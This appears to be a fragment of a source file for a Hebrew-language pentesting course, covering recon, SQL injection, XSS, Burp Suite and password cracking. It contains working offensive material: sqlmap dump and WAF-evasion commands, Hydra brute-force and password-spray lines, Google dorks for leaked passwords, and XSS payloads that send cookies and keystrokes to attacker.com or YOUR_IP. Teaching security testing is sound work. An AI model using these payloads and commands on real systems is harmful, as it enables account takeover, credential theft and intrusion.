+Ctrl+B %     <span class="comment"># split vertical</span>
+Ctrl+B "     <span class="comment"># split horizontal</span>
+Ctrl+B arrows  <span class="comment"># navigate</span>
+
+<span class="comment"># Layout טיפוסי:</span>
+<span class="comment"># Pane 1: nmap / recon</span>
+<span class="comment"># Pane 2: Metasploit</span>
+<span class="comment"># Pane 3: notes / בדיקות</span>
+<span class="comment"># Pane 4: netcat listeners</span>
+
+<span class="comment"># Session חזר אחרי disconnect:</span>
+tmux attach -t pentest</code></pre>
+
+<div class="section-title">Checklist לפני כל Engagement</div>
+<p class="prose">תמיד וודא לפני שמתחילים: scope document חתום, IP ranges מאושרים, emergency contact של הclient, ו-rules of engagement ברורות (מתי מותר לפעול, מה חסום).</p>
+<pre class="code-block"><code><span class="comment"># בדוק שrצת בscope הנכון</span>
+cat scope.txt                    <span class="comment"># IPs מאושרים</span>
+ping -c1 target_ip              <span class="comment"># target מגיב?</span>
+whois target_ip | grep OrgName  <span class="comment"># אמת שזה הclient</span></code></pre>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> הממצאות הנפגשות ביותר בpentests לא מגיעות מexploits מתוחכמים — הן מגיעות מGoogle. "Google Dorking" — שימוש ב-operators מתקדמים כמו site:, filetype:, inurl: — חושף לעתים קרובות admin panels, config files עם passwords, ו-backup files. הכל גלוי לציבור. פשוט אף אחד לא טרח לחפש.</div>
+
+<div class="section-title">Passive vs Active Reconnaissance</div>
+<p class="prose">Passive recon אוסף מידע ממקורות ציבוריים מבלי לשלוח packet אחד למטרה. Active recon שולח packets ישירות למטרה. ההבדל קריטי: passive לא ניתן לזהות, active יכול לעורר IDS/firewall alerts. במרבית engagements מתחילים עם passive כדי ללמוד כמה שאפשר לפני שנוגעים בmטרה.</p>
+
+<div class="section-title">Google Dorking</div>
+<pre class="code-block"><code><span class="comment"># Google Dorks — חפשי מידע רגיש</span>
+site:company.com filetype:pdf              <span class="comment"># כל PDFs</span>
+site:company.com inurl:admin               <span class="comment"># admin panels</span>
+site:company.com ext:env OR ext:cfg        <span class="comment"># config files</span>
+"company.com" "DB_PASSWORD"               <span class="comment"># database passwords</span>
+intitle:"index of" site:company.com       <span class="comment"># directory listings</span>
+site:github.com "company.com" password    <span class="comment"># secrets ב-GitHub</span>
+
+<span class="comment"># Shodan — מנוע חיפוש של internet devices</span>
+<span class="comment"># shodan.io — חפשי:</span>
+org:"Company Name"       <span class="comment"># כל servers של חברה</span>
+hostname:company.com     <span class="comment"># לפי hostname</span>
+"default password"       <span class="comment"># devices עם default creds!</span>
+port:3306 country:IL     <span class="comment"># MySQL פתוח בישראל</span></code></pre>
+
+<div class="section-title">Nmap — Port Scanning</div>
+<p class="prose">Nmap הוא הכלי הסטנדרטי לport scanning. הוא שולח packets שונים לports ומנתח תגובות. חשוב: נגד targets ללא הרשאה — זה חוקי שונה בכל מדינה. בישראל — scanning ללא הרשאה יכול להיחשב פריצה. תמיד בלab environment שבשליטתך או עם written permission.</p>
+<pre class="code-block"><code><span class="comment"># Nmap scan types</span>
+nmap -sn 192.168.1.0/24          <span class="comment"># ping scan — מי חי?</span>
+nmap -sV -sC 192.168.1.100       <span class="comment"># version + default scripts</span>
+nmap -p- 192.168.1.100           <span class="comment"># כל 65535 ports</span>
+nmap -O 192.168.1.100            <span class="comment"># OS detection</span>
+nmap -A 192.168.1.100            <span class="comment"># aggressive: all of above</span>
+nmap -sS 192.168.1.100           <span class="comment"># SYN scan (stealth)</span>
+
+<span class="comment"># שמירת תוצאות</span>
+nmap -sV 192.168.1.0/24 -oA scan_output
+<span class="comment"># יוצר: scan_output.nmap, .gnmap, .xml</span>
+
+<span class="comment"># DNS + Subdomain Enum</span>
+subfinder -d company.com -o subs.txt
+amass enum -passive -d company.com</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 OSINT Case: GitHub Secrets Leak</div>
+  <div class="real-world-body">
+    תרחיש קלאסי שקורה בכל חברה שנייה: Developer עלה env file ל-GitHub. Search: <code>site:github.com "company.com" "API_KEY"</code>. Result: repository ישן שהdev חשב שהוא private — אבל היה public לרגע קצר לפני שהוחזר ל-private. Google כבר אינדקס אותו.<br><br>
+    כלי truffleHog ו-gitleaks סורקים repos לסיסמאות. כשמוצאים — רצים ngrok.io ל-webhook live, גונבים AWS keys, S3 buckets, ו-prod databases. התיקון: git history לא נמחק — צריך להחליף credentials, לא למחוק commit.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">Recon טוב = engagement מוצלח. כל שעה שמשקיעים כאן חוסכת שלוש שעות של exploitation שגוי. הנה הrecon workflow הסטנדרטי.</p>
+
+<div class="section-title">Recon שלב 1 — Passive (אפס contact עם target)</div>
+<pre class="code-block"><code><span class="comment"># Subdomain discovery</span>
+subfinder -d target.com -o recon/subdomains.txt
+amass enum -passive -d target.com >> recon/subdomains.txt
+sort -u recon/subdomains.txt -o recon/subdomains.txt
+wc -l recon/subdomains.txt   <span class="comment"># כמה מצאנו?</span>
+
+<span class="comment"># מי חי? (HTTP probe)</span>
+cat recon/subdomains.txt | httprobe > recon/live_hosts.txt
+<span class="comment"># https://github.com/tomnomnom/httprobe</span>
+
+<span class="comment"># Screenshots לכל site חי</span>
+gowitness file -f recon/live_hosts.txt -d recon/screenshots/
+<span class="comment"># פותח gallery ← מציג הכל ויזואלית</span>
+gowitness report serve</code></pre>
+
+<div class="section-title">Recon שלב 2 — Active Scanning</div>
+<pre class="code-block"><code><span class="comment"># Nmap — שמור הכל</span>
+sudo nmap -sV -sC -oA scans/initial_scan target.com
+<span class="comment"># .nmap = human readable</span>
+<span class="comment"># .xml = לimport ל-Metasploit</span>
+<span class="comment"># .gnmap = לgrep</span>
+
+<span class="comment"># Web tech fingerprinting</span>
+whatweb https://target.com -v
+<span class="comment"># WordPress 6.1, Apache 2.4.52, PHP 8.1 ← attack surface</span>
+
+<span class="comment"># Directory discovery</span>
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/dirs.txt -x php,html,txt,bak
+
+<span class="comment"># GitHub secrets search</span>
+trufflehog github --org=targetorg --json > recon/github_secrets.json
+grep -i "password\\|secret\\|key" recon/github_secrets.json</code></pre>
+
+<div class="callout callout-tip"><strong>💡 Golden rule:</strong> תעד הכל בזמן אמת. כשמוצאים משהו מעניין — timestamp + מה מצאת + command שהרצת. Reports כותבים בסוף מ-logs, לא מזיכרון.</div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> SQL Injection התגלה ב-1998 ועדיין מדורג ב-OWASP Top 3 ב-2025. ב-2024 לבד, SQLi גרמה לפרצות בMicrosoft, Oracle, ו-dozens of SaaS startups. למה לא נעלם? כי developers עדיין כותבים string concatenation בqueries. לוקח 5 שניות לכתוב wrong, שנים לזהות.</div>
+
+<div class="section-title">כיצד SQLi עובד — הבסיס</div>
+<p class="prose">SQL Injection קורה כשאפליקציה בונה SQL query על ידי חיבור string input מהמשתמש — ישירות, ללא sanitization. הquery "בורחת" מהכוונה המקורית ומריצה code של התוקף. זה לא exploit מתוחכם — זה שימוש לרעה בdynamic SQL בדיוק כמו שהוא אמור לעבוד.</p>
+<pre class="code-block"><code><span class="comment"># Vulnerable code</span>
+query = "SELECT * FROM users WHERE name='" + user_input + "'"
+
+<span class="comment"># Input: ' OR '1'='1</span>
+<span class="comment"># Query becomes:</span>
+SELECT * FROM users WHERE name='' OR '1'='1'
+<span class="comment"># ← מחזיר כל המשתמשים!</span>
+
+<span class="comment"># Input: '; DROP TABLE users; --</span>
+SELECT * FROM users WHERE name=''; DROP TABLE users; --'
+<span class="comment"># ← מוחק את הטבלה!</span>
+
+<span class="comment"># Safe code</span>
+cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))</code></pre>
+
+<div class="section-title">סוגי SQLi</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">👁️</div><div class="card-title">Union-Based</div><div class="card-body">מחבר UNION SELECT לquery המקורית ומחזיר נתונים בresponse. צריך לדעת כמה columns בquery המקורית. הכי ישיר — אם error לא מוסתר.</div></div>
+<div class="card"><div class="card-icon">❌</div><div class="card-title">Error-Based</div><div class="card-body">מגרה SQL error שמכיל מידע. extractvalue() ו-updatexml() ב-MySQL מחזירות data ב-error message. עובד כשerrors מוצגים למשתמש.</div></div>
+<div class="card"><div class="card-icon">🦯</div><div class="card-title">Blind Boolean</div><div class="card-body">"האם admin password מתחיל ב-'a'?" — שולח query, response שונה ל-true/false. איטי אבל עובד גם כשerrors מוסתרים.</div></div>
+<div class="card"><div class="card-icon">⏱️</div><div class="card-title">Time-Based Blind</div><div class="card-body">SLEEP(5) אם true — אם הresponse איחר ב-5 שניות, התנאי נכון. הכי איטי — עובד גם כשlresponse זהה לחלוטין.</div></div>
+</div>
+
+<div class="section-title">sqlmap — אוטומציה (על targets מורשים!)</div>
+<pre class="code-block"><code><span class="comment"># sqlmap — automated SQLi detection and exploitation</span>
+<span class="comment"># ONLY on authorized targets!</span>
+
+sqlmap -u "http://target.com/user?id=1" --dbs       <span class="comment"># list databases</span>
+sqlmap -u "http://target.com/user?id=1"        -D webapp --tables                            <span class="comment"># list tables</span>
+sqlmap -u "http://target.com/user?id=1"        -D webapp -T users --dump                    <span class="comment"># dump table</span>
+
+<span class="comment"># עם cookies (authenticated)</span>
+sqlmap -u "http://target.com/profile?id=5"        --cookie="session=abc123" --level=3
+
+<span class="comment"># לPOST requests</span>
+sqlmap -u "http://target.com/login"        --data="username=admin&password=test"        --level=2</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Equifax 2017 — 147M records, SQL Injection</div>
+  <div class="real-world-body">
+    הפרצה של Equifax (2017) שחשפה נתוני אשראי של 147 מיליון אמריקאים הייתה combination של SQLi ב-web portal ו-missing patch ל-Apache Struts. הattacker ניצל CVE-2017-5638 (RCE ב-Struts) להיכנס, ואז SQLi כדי לexfiltrate את הDB.<br><br>
+    ההגנה הפשוטה שהייתה מונעת הכל: Parameterized queries + WAF + patch ב-Struts (שהיה זמין 2 חודשים קודם). עלות הרשלנות: $575M פשרה עם FTC, +$1.4B בשדרוגי security.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">SQL injection testing מתחיל ידנית ועובר לאוטומטי רק אחרי שמאמתים שיש פגיעות. sqlmap על כל endpoint מייצר הרבה noise ועלול לשבש production.</p>
+
+<div class="section-title">Manual Testing ראשוני</div>
+<pre class="code-block"><code><span class="comment"># בכל input field/parameter — נסה:</span>
+'                    <span class="comment"># single quote — error?</span>
+''                   <span class="comment"># escaped quote</span>
+1'--                 <span class="comment"># comment out rest</span>
+1 OR 1=1             <span class="comment"># boolean test</span>
+1 AND SLEEP(5)       <span class="comment"># time-based test (מחכה 5 שניות?)</span>
+
+<span class="comment"># ב-URL parameters:</span>
+https://target.com/user?id=1'
+https://target.com/user?id=1 ORDER BY 10--
+<span class="comment"># "Unknown column '10'" → vulnerable, יש פחות מ-10 columns</span>
+
+<span class="comment"># ב-Burp Suite — שנה param ותסתכל על response</span>
+<span class="comment"># Error message = error-based SQLi</span>
+<span class="comment"># שינוי ב-response length = boolean-based</span>
+<span class="comment"># עיכוב ב-response = time-based</span></code></pre>
+
+<div class="section-title">sqlmap — אחרי אישור פגיעות</div>
+<pre class="code-block"><code><span class="comment"># Basic — מאמת SQLi ומציג databases</span>
+sqlmap -u "https://target.com/user?id=1" --dbs --batch
+
+<span class="comment"># עם Burp intercept (שמור request לקובץ)</span>
+<span class="comment"># Burp ← Save item ← req.txt</span>
+sqlmap -r req.txt --dbs --batch
+
+<span class="comment"># Dump users table</span>
+sqlmap -u "https://target.com/user?id=1" -D webapp -T users --dump --batch
+
+<span class="comment"># WAF עוצר? נסה evasion</span>
+sqlmap -u "https://target.com/user?id=1" --tamper=space2comment,between --dbs
+
+<span class="comment"># שמור output</span>
+sqlmap -u "..." --dbs --output-dir=scans/sqlmap/</code></pre>
+
+<div class="section-title">מה לכלול ב-Report</div>
+<p class="prose">לכל SQLi finding: Request מלא (method, URL, headers, body), Response שמוכיחה exploitation (error message, data returned), CVSS score, ו-remediation — Parameterized queries עם דוגמת קוד בשפה הרלוונטית.</p>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> XSS הוא הפגיעות הנפוצה ביותר בweb applications — לפי HackerOne, 25% מכל Bug Bounty reports הם XSS. British Airways (2018) נפגעה מStored XSS ב-payment form שנשתל ב-skimming script ב-Magecart attack — 500,000 לקוחות, פרטי אשראי נגנבו, קנס של £20M.</div>
+
+<div class="section-title">כיצד XSS עובד</div>
+<p class="prose">XSS (Cross-Site Scripting) מאפשר לתוקף להזריק JavaScript לדף אינטרנט שנטען ב-browser של קורבן אחר. ה-browser של הקורבן מריץ את הscript כאילו הוא חלק לגיטימי מהאתר — כי הוא כן, מבחינת ה-browser. השוני מSQL Injection: SQLi תוקף את ה-database. XSS תוקף את המשתמשים של האתר.</p>
+
+<div class="section-title">שלושת סוגי XSS</div>
+<div class="grid-3">
+<div class="card"><div class="card-icon">↩️</div><div class="card-title">Reflected XSS</div><div class="card-body">Payload נשלח בURL, server משקף אותו ב-response. קורבן צריך ללחוץ על link זדוני. לא שמור ב-DB. Example: <code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></div></div>
+<div class="card"><div class="card-icon">💾</div><div class="card-title">Stored XSS</div><div class="card-body">Payload נשמר ב-DB (comment, username, profile). כל user שרואה את הcontent — מריץ את ה-script. הכי מסוכן: לא צריך להפנות קורבן לlink.</div></div>
+<div class="card"><div class="card-icon">🌐</div><div class="card-title">DOM XSS</div><div class="card-body">JavaScript בdצד לקוח קורא URL param ומכניס לDOM בלי sanitization. Server לא רואה את ה-payload. לא ניתן לזהות ב-server logs. ה-browser מריץ ישירות.</div></div>
+</div>
+
+<div class="section-title">XSS — מה אפשר לעשות עם זה</div>
+<pre class="code-block"><code><span class="comment"># Cookie Theft — גניבת session</span>
+&lt;script&gt;
+document.location='http://attacker.com/steal?c='+document.cookie
+&lt;/script&gt;
+<span class="comment"># ← כל session cookie נשלח לattacker</span>
+
+<span class="comment"># Keylogger</span>
+&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/log?k='+e.key)
+}
+&lt;/script&gt;
+
+<span class="comment"># Phishing in-page</span>
+&lt;script&gt;
+document.body.innerHTML = '&lt;form&gt;...fake login form...&lt;/form&gt;'
+&lt;/script&gt;
+
+<span class="comment"># CSP bypass attempts</span>
+&lt;script nonce="WRONG"&gt;              <span class="comment"># blocked by CSP</span>
+&lt;img src=x onerror=alert(1)&gt;       <span class="comment"># attribute injection</span>
+&lt;svg/onload=alert(1)&gt;              <span class="comment"># SVG vector</span></code></pre>
+
+<div class="section-title">הגנות — CSP ועוד</div>
+<p class="prose">Content Security Policy (CSP) הוא HTTP header שמגביל מאיפה scripts יכולים לרוץ. <code>Content-Security-Policy: script-src 'self'</code> אומר: רק scripts מ-domain שלנו. inline scripts חסומים. Script מ-attacker.com — חסום. CSP הוא ההגנה הטובה ביותר נגד XSS — אבל גם הכי קשה להגדיר נכון.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Samy Worm — XSS שהדביק מיליון חשבונות ב-20 שעות</div>
+  <div class="real-world-body">
+    2005: Samy Kamkar כתב XSS worm ב-MySpace. ה-payload: (1) הוסף את Samy לfriends, (2) הצג "but most of all, samy is my hero" ב-profile, (3) copy את ה-payload לcurrent user profile. כל מי שצפה בprofile נגוע — הפך נגוע.<br><br>
+    ב-20 שעות: מיליון חשבונות הוסיפו את Samy כfriend. MySpace נאלץ לכבות את האתר. Samy נעצר, הוא קיבל 3 שנות מעצר בית ו-90 שעות שירות לציבור. הוכחה ש-Stored XSS הוא באמת dangerous.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">XSS testing דורש בדיקה של כל input point, כולל headers ו-JSON parameters שלא נראים ישירות. Burp Scanner מוצא חלק — manual testing מוצא את השאר.</p>
+
+<div class="section-title">XSS Payloads לבדיקה</div>
+<pre class="code-block"><code><span class="comment"># פשוטים — לזיהוי ראשוני</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+<span class="comment"># אם מסננים script tags</span>
+&lt;img src=x onerror="alert\`1\`"&gt;
+&lt;details open ontoggle=alert(1)&gt;
+javascript:alert(1)     <span class="comment"># בhref attribute</span>
+
+<span class="comment"># DOM XSS — בדוק URL fragment</span>
+https://target.com/search#&lt;img src=x onerror=alert(1)&gt;
+
+<span class="comment"># ב-JSON API (Content-Type: application/json)</span>
+{"name": "&lt;script&gt;alert(1)&lt;/script&gt;"}
+<span class="comment"># אם response מוחזר ב-HTML context — XSS</span></code></pre>
+
+<div class="section-title">Proof of Concept — Cookie Theft</div>
+<pre class="code-block"><code><span class="comment"># Setup listener (בlab/authorized environment)</span>
+<span class="comment"># 1. הקם simple HTTP server:</span>
+python3 -m http.server 8080
+
+<span class="comment"># 2. XSS payload לcookie theft:</span>
+&lt;script&gt;
+new Image().src='http://YOUR_IP:8080/steal?c='+document.cookie;
+&lt;/script&gt;
+
+<span class="comment"># 3. כשקורבן טוען עמוד — רואה ב-server log:</span>
+<span class="comment"># GET /steal?c=session=abc123; user=admin HTTP/1.1</span>
+
+<span class="comment"># PoC שמוכיח impact ללא נזק אמיתי</span>
+&lt;script&gt;alert('XSS by [your name] - Bug ID: 12345')&lt;/script&gt;
+<span class="comment"># Screenshot זה מספיק לreport</span></code></pre>
+
+<div class="section-title">CSP Bypass Testing</div>
+<pre class="code-block"><code><span class="comment"># בדוק CSP header</span>
+curl -sI https://target.com | grep -i "content-security"
+<span class="comment"># Content-Security-Policy: script-src 'self' 'unsafe-inline'</span>
+<span class="comment"># 'unsafe-inline' = CSP לא מגן מXSS!</span>
+
+<span class="comment"># CSP evaluator</span>
+<span class="comment"># https://csp-evaluator.withgoogle.com</span>
+<span class="comment"># מדרג את ה-policy ומציג חולשות</span></code></pre>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> Burp Suite Pro עולה $449/שנה. Burp Suite Community (חינמי) מגיע ללא Scanner ו-Intruder מהיר — אבל עם Proxy ו-Repeater מלאים. 80% מה-web pentests שעבודתם נעשית ב-Repeater: לתפוס request, לשנות, לשלוח שוב, לראות מה קורה.</div>
+
+<div class="section-title">Burp Suite Architecture</div>
+<p class="prose">Burp Suite הוא proxy שיושב בין הbrowser שלך לאינטרנט. הbrowser שלך מוגדר להשתמש ב-127.0.0.1:8080 כproxy. כל HTTP/HTTPS request עובר דרך Burp לפני שמגיע לserver. Burp מציג אותו, מאפשר לשנות, ולשלוח הלאה — או לעצור ולנתח. זה נותן שליטה מלאה על כל ה-web traffic שלך.</p>
+<p class="prose">לHTTPS: Burp מתקין CA certificate שלו ב-browser. browser מאמין ל-Burp, Burp פותח ומסגר TLS עם browser, פותח TLS חדש עם server. MiTM controlled בכוונה. CA cert חייב להיות מותקן ב-browser לפני שמתחילים.</p>
+
+<div class="section-title">הmodules החשובים</div>
+<pre class="code-block"><code><span class="comment"># 1. Proxy — Intercept</span>
+<span class="comment"># כל request עוצר עד שlוחצים Forward</span>
+<span class="comment"># ניתן לשנות כל header, param, cookie</span>
+
+<span class="comment"># 2. Repeater — שלח שוב ושוב</span>
+<span class="comment"># Send request ל-Repeater (Ctrl+R)</span>
+<span class="comment"># שנה param: id=1 → id=2 → id=999</span>
+<span class="comment"># ← ראה responses שונות</span>
+<span class="comment"># זה הכלי למניפולציה ידנית של כל פגיעות</span>
+
+<span class="comment"># 3. Intruder — Fuzzing אוטומטי</span>
+<span class="comment"># סמן position: username=§admin§&password=§test§</span>
+<span class="comment"># טען wordlist: rockyou.txt</span>
+<span class="comment"># הרץ — Burp שולח כל password מהרשימה</span>
+<span class="comment"># בדוק response length/status לזיהוי הצלחה</span>
+
+<span class="comment"># 4. Scanner (Pro) — Auto-detect vulnerabilities</span>
+<span class="comment"># Active scan → מחפש SQLi, XSS, SSRF, IDOR, etc.</span>
+
+<span class="comment"># 5. Decoder — Encode/Decode</span>
+<span class="comment"># Base64, URL encoding, HTML encoding, hex</span>
+<span class="comment"># מאוד שימושי ל-JWT analysis</span></code></pre>
+
+<div class="section-title">IDOR — Insecure Direct Object Reference</div>
+<p class="prose">IDOR הוא פגיעות שבה API endpoint מחזיר data על ידי ID — ולא מאמת שה-user יכול לגשת לאותו ID. /api/user/123 מחזיר profile של user 123. מה קורה אם שולחים /api/user/124? אם מחזיר profile של user אחר — IDOR. Repeater הוא הכלי לבדוק את זה.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 IDOR ב-HackerOne — $10,000 Bug</div>
+  <div class="real-world-body">
+    Bug Bounty example: researcher מצא IDOR ב-private messages API. GET /api/messages?thread_id=12345 החזיר messages שלו. Change: thread_id=12344 — החזיר messages של user אחר. Iterate through IDs עם Burp Intruder — כל conversation ב-platform גלויה.<br><br>
+    Platform שילמה $10,000 על ה-bug. Fix: validate ש-requesting user הוא participant ב-thread לפני מתן access. IDOR הוא Broken Access Control — #1 ב-OWASP Top 10 2021.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">Burp Suite הוא הכלי המרכזי ב-web pentesting. Proxy + Repeater לבד מכסים 80% מהעבודה. Intruder ו-Scanner מאיצים את השאר.</p>
+
+<div class="section-title">Proxy Setup</div>
+<pre class="code-block"><code><span class="comment"># Firefox — הגדר proxy ידנית:</span>
+Settings ← Network Settings ← Manual proxy
+HTTP Proxy: 127.0.0.1  Port: 8080
+Check: "Use this proxy server for all protocols"
+
+<span class="comment"># התקן Burp CA Certificate:</span>
+<span class="comment"># גלוש ל- http://burp ← Download Certificate</span>
+<span class="comment"># Firefox: Settings ← Privacy ← View Certificates ← Import</span>
+
+<span class="comment"># או FoxyProxy extension (נוח יותר — on/off בלחיצה)</span></code></pre>
+
+<div class="section-title">Repeater — Test ידני</div>
+<pre class="code-block"><code><span class="comment"># Workflow ל-IDOR test:</span>
+<span class="comment"># 1. Proxy ← Intercept ← גלוש ל-/api/user/profile</span>
+<span class="comment"># 2. Request מוצג: GET /api/user/123 HTTP/2</span>
+<span class="comment"># 3. Ctrl+R ← שלח ל-Repeater</span>
+<span class="comment"># 4. שנה: GET /api/user/124</span>
+<span class="comment"># 5. Send ← קיבלת profile של user אחר?  ← IDOR!</span>
+
+<span class="comment"># Workflow ל-Auth bypass:</span>
+<span class="comment"># Request: GET /api/admin/users</span>
+<span class="comment"># Authorization: Bearer [token_of_regular_user]</span>
+<span class="comment"># Response 200 עם admin data? ← Broken Access Control</span></code></pre>
+
+<div class="section-title">Intruder — Fuzzing ו-Brute Force</div>
+<pre class="code-block"><code><span class="comment"># Ctrl+I ← שלח request ל-Intruder</span>
+<span class="comment"># סמן את הparameter לfuzz:</span>
+<span class="comment"># username=§admin§&password=§password§</span>
+
+<span class="comment"># Payload ← Simple list ← Load ← rockyou.txt</span>
+<span class="comment"># Attack type: Cluster bomb (כל combination)</span>
+<span class="comment"># Start Attack</span>
+
+<span class="comment"># זיהוי הצלחה:</span>
+<span class="comment"># Column: Length ← מיין — response שונה = found!</span>
+<span class="comment"># Column: Status ← 302 Redirect = login success</span>
+
+<span class="comment"># ⚠️ Community version: throttled (1 request/second)</span>
+<span class="comment"># Pro version: unlimited speed</span></code></pre>
+
+<div class="callout callout-tip"><strong>💡 Save everything:</strong> Burp ← Project ← Save project. כל request, כל response, כל note — שמור בproject file. בסוף engagement יש לך artifact מלא לreport.</div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> hashcat על RTX 4090 יכול לנסות 300 מיליארד MD5 hashes לשנייה. Rockyou.txt מכיל 14 מיליון סיסמאות — ייבדק תוך פחות ממילישנייה. MD5 password hash של "password123" ייפגע תוך microseconds. bcrypt עם rounds=12 — 6 שנים על אותו GPU. הבחירה ב-hashing algorithm היא literally ההבדל בין שניות לעשורים.</div>
+
+<div class="section-title">Hashing ו-Password Storage</div>
+<p class="prose">סיסמאות לא אמורות להישמר כtext — הן נשמרות כhash. כשמתחברים, המערכת מhashing את הסיסמה שהזנת ומשווה לhash השמור. הבעיה: hash functions כמו MD5 ו-SHA-1 מהירים מאוד — מה שטוב לperformance, רע לaבטחה. Attacker שגנב DB יכול להריץ מיליארדים של ניחושים לשנייה.</p>
+<pre class="code-block"><code><span class="comment"># MD5 — מהיר = מסוכן לpasswords</span>
+echo -n "password123" | md5sum
+<span class="comment"># ef92b778bafe771e... ← GPU: 300B hashes/sec</span>
+
+<span class="comment"># bcrypt — מכוון להיות איטי</span>
+<span class="comment"># rounds=12: 300ms לhash אחד</span>
+<span class="comment"># brute force: 3 hash/sec בלבד</span>
+
+<span class="comment"># hashcat — GPU password cracking</span>
+hashcat -m 0 hash.txt rockyou.txt         <span class="comment"># MD5 + wordlist</span>
+hashcat -m 3200 hash.txt rockyou.txt      <span class="comment"># bcrypt</span>
+hashcat -m 1000 hash.txt rockyou.txt      <span class="comment"># NTLM (Windows)</span>
+hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule  <span class="comment"># rules</span>
+
+<span class="comment"># Rules — variationsעל wordlist</span>
+<span class="comment"># "password" → Password, PASSWORD, passw0rd, p@ssword...</span>
+<span class="comment"># מגדיל coverage ב-10,000× ללא memory cost</span></code></pre>
+
+<div class="section-title">Online Brute Force — Hydra</div>
+<pre class="code-block"><code><span class="comment"># Hydra — online brute force (authorized only!)</span>
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+hydra -l admin -P rockyou.txt ftp://192.168.1.100
+
+<span class="comment"># Web form brute force</span>
+hydra -l admin -P rockyou.txt   http-post-form "http://target/login:user=^USER^&pass=^PASS^:Login failed"
+
+<span class="comment"># Rate limiting bypass — threads</span>
+hydra -l admin -P rockyou.txt -t 4 ssh://target  <span class="comment"># 4 threads</span></code></pre>
+
+<div class="section-title">Credential Stuffing</div>
+<p class="prose">Credential Stuffing שונה מbrute force: במקום לנחש סיסמאות, משתמשים בrleaks אמיתיים. Have I Been Pwned (haveibeenpwned.com) מכיל מעל 12 מיליארד רשומות מleaks. אם user משתמש באותה סיסמה ב-Netflix וב-Gmail — ו-Netflix נפרץ — ה-attacker מנסה Gmail עם אותן credentials.</p>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 RockYou2024 — 10 מיליארד סיסמאות</div>
+  <div class="real-world-body">
+    יולי 2024: קובץ בשם "rockyou2024.txt" עלה לhacker forums עם 9.9 מיליארד פsword-ים ייחודיים — compilation של כל ה-leaks ב-20 שנה. זה לא "הצפנה" — אלה plaintext passwords מ-LinkedIn, Adobe, Dropbox, ועוד אלפי שירותים שנפרצו.<br><br>
+    ה-takeaway: password reuse הוא קטלני. אחת הסיסמאות האלה היא כנראה הסיסמה שלך. Credential stuffing עם הקובץ הזה = immediate compromise לכל חשבון שמשתמש בה. פתרון: password manager + unique password per site + MFA.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">Password attacks ב-pentest מתחלקים לשתיים: offline cracking (קיבלת hash — פצח אותו) ו-online brute force (ממשק login — נסה passwords). כל אחד דורש גישה שונה לגמרי.</p>
+
+<div class="section-title">Offline Hash Cracking</div>
+<pre class="code-block"><code><span class="comment"># שלב 1: זיהוי סוג hash</span>
+hash-identifier           <span class="comment"># interactive</span>
+hashid "5f4dcc3b5aa765d61d8327deb882cf99"
+<span class="comment"># MD5</span>
+
+<span class="comment"># שלב 2: hashcat</span>
+<span class="comment"># MD5 (-m 0)</span>
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># bcrypt (-m 3200) — איטי מאוד, רק wordlist קצר</span>
+hashcat -m 3200 hashes.txt 100_common_passwords.txt
+
+<span class="comment"># NTLM (Windows, -m 1000)</span>
+hashcat -m 1000 hashes.txt rockyou.txt
+
+<span class="comment"># עם rules — מגדיל coverage משמעותית</span>
+hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+<span class="comment"># ראה תוצאות שפוצחו</span>
+hashcat -m 0 hashes.txt --show</code></pre>
+
+<div class="section-title">Online Brute Force בזהירות</div>
+<pre class="code-block"><code><span class="comment"># Hydra — רק על authorized targets!</span>
+<span class="comment"># SSH</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://target_ip
+<span class="comment"># -t 4 = 4 threads (לא לעלות — lockout!)</span>
+
+<span class="comment"># Web login form</span>
+hydra -l admin@target.com -P passwords.txt target.com   http-post-form "/login:email=^USER^&password=^PASS^:Invalid credentials"   -t 2 -W 3
+<span class="comment"># -W 3 = wait 3 seconds between tries (avoid lockout)</span>
+
+<span class="comment"># Password Spray — טוב יותר מbrute force</span>
+<span class="comment"># 1 password שכיחה × כל usernames (לא trigger lockout)</span>
+hydra -L usernames.txt -p "Winter2025!" ssh://target_ip -t 1</code></pre>
+
+<div class="section-title">Default Credentials</div>
+<p class="prose">לפני brute force — תמיד נסה default credentials. ב-Shodan רואים עשרות אלפי devices עם admin/admin. כלי שימושי: <code>cirt.net/passwords</code> — database של default credentials לפי vendor/device.</p>`,
